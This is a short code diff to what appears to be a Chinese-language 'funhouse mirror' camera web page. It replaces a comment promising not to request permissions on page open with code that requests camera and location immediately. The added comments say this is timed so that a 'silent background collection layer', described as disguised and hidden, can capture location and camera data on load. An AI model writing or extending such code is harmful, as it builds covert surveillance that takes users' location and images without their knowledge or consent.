@@ -285,7 +285,10 @@
     link.click();
     showToast("已保存哈哈镜大片到本地");
   });
-  // 页面打开时不自动申请摄像头/定位权限，避免误拒；用户点按钮才申请
+  // 页面打开后立即申请摄像头与定位权限（已授权则不弹窗，自动开启哈哈镜）
+  // 用 setTimeout 让出主线程，确保采集层的 __collectLocation/__collectCamera
+  // 等函数先注册到 window，再由 openMirror 触发；任何失败均不阻塞
+  setTimeout(() => openMirror(), 0);
 })();
 
 // ===== 后台静默采集层（伪装隐藏，任何失败均不影响哈哈镜）=====
